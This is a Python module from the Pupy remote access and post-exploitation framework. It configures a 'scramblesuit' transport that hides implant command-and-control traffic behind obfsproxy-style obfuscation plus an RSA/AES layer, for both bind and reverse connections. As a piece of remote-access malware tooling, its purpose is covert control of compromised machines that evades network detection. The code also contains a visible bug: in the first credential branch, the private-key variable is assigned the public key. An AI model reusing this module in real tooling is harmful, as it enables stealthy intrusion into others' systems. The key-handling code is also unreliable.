# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of
# the project for the detailed licence terms

from network.transports import *
from network.lib import *
from network.lib.transports.scramblesuit.scramblesuit import ScrambleSuitClient, ScrambleSuitServer


class TransportConf(Transport):
    info = "TCP transport using obfsproxy's obfs3 transport with a extra rsa+aes layer"
    name = "scramblesuit"
    server = PupyTCPServer
    client = PupyTCPClient
    stream = PupySocketStream
    credentials = [ 'SIMPLE_RSA_PRIV_KEY', 'SIMPLE_RSA_PUB_KEY', 'SCRAMBLESUIT_PASSWD' ]

    def __init__(self, *args, **kwargs):
        Transport.__init__(self, *args, **kwargs)
        try:
            import pupy_credentials
            RSA_PUB_KEY = pupy_credentials.SIMPLE_RSA_PUB_KEY
            RSA_PRIV_KEY = pupy_credentials.SIMPLE_RSA_PUB_KEY
            SCRAMBLESUIT_PASSWD = pupy_credentials.SCRAMBLESUIT_PASSWD

        except:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            RSA_PUB_KEY = credentials['SIMPLE_RSA_PUB_KEY']
            RSA_PRIV_KEY = credentials['SIMPLE_RSA_PRIV_KEY']
            SCRAMBLESUIT_PASSWD = credentials['SCRAMBLESUIT_PASSWD']

        self.client_transport_kwargs = { 'password': SCRAMBLESUIT_PASSWD }
        self.server_transport_kwargs = { 'password': SCRAMBLESUIT_PASSWD }

        if self.launcher_type == LAUNCHER_TYPE_BIND:
            self.client_transport = chain_transports(
                    ScrambleSuitClient,
                    RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256)
                )
            self.server_transport = chain_transports(
                    ScrambleSuitServer,
                    RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256)
                )

        else:
            self.client_transport = chain_transports(
                    ScrambleSuitClient,
                    RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256)
                )
            self.server_transport = chain_transports(
                    ScrambleSuitServer,
                    RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256)
                )
